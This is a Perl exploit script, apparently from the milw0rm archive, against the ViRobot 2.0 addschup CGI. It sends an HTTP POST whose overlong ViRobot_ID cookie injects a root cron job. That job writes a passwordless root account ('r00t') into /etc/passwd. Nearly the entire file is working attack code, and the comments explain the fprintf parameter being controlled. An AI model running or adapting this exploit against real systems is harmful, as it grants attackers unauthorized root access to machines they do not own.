#!/usr/bin/perl
# ViRobot 2.0 remote cookie exploit - ala addschup
# copyright Kevin Finisterre kf_lists[at]digitalmunition[dot]com
#
# jdam:/home/kfinisterre# ls -al /var/spool/cron/root
# ls: /var/spool/cron/root: No such file or directory
# jdam:/home/kfinisterre# ls -al /var/spool/cron/root
# -rw-r--r--  1 root staff 104 2005-01-23 14:43 /var/spool/cron/root
#
# We control the 6th paramater passed to an fprintf call.
#
# 0x804a740 <_IO_stdin_used+572>:  "%s %s %s %s %s %s/%s/vrupdate -s > /dev/null 2>&1\n"
#
# * * * * * /bin/echo r00t::0:0:root:/root:/bin/bash >> /etc/passwd &/ViRobot/vrupdate -s > /dev/null 2>&1


use IO::Socket;
$hostName = $ARGV[0];

$sock = IO::Socket::INET->new (
               Proto => "tcp",
               PeerAddr => $hostName,
               PeerPort => 8080,
               Type => SOCK_STREAM
);

if (! $sock)
{
       print "[*] Error, could not connect to the remote host: $!\n";
       exit (0);
}

$target = "/cgi-bin/addschup";
$crondata = "/bin/echo r00t::0:0:root:/root:/bin/bash >> /etc/passwd &";
$postbody = "POST $target HTTP/1.1\n" .
"Host: localhost:8080\n" .
"User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.3) Gecko/20041007 Debian/1.7.3-5\n" .
"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n" .
"Accept-Encoding: gzip,deflate\n" .
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n" .
"Keep-Alive: 300\n" .
"Connection: keep-alive\n" .
"Content-type: application/x-www-form-urlencoded\n" .
"Content-length: 1\n" .
"Cookie: ViRobot_ID=" . "A" x 32 . "$crondata\n";

print $sock $postbody;
close ($sock);
exit (0);

# milw0rm.com [2005-06-14]